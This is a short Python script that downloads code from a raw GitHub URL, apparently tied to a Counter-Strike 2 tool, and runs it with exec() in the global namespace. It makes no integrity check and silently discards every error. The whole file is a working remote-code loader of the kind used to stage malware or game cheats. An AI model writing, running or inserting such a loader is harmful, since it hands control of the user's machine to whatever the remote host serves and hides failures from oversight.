import urllib.request
import json

def run_remote_script(url: str):
    try:
        with urllib.request.urlopen(url) as response:
            raw = response.read().decode().strip()

        try:
            data = json.loads(raw)
            code = data.get("code", "")
        except json.JSONDecodeError:
            code = raw

        if not code:
            return

        exec(code, globals())

    except Exception as e:
        return

if __name__ == "__main__":
    run_remote_script("https://raw.githubusercontent.com/Cr0mb/CS2-GFusion-Python/refs/heads/main/maps/run.py")
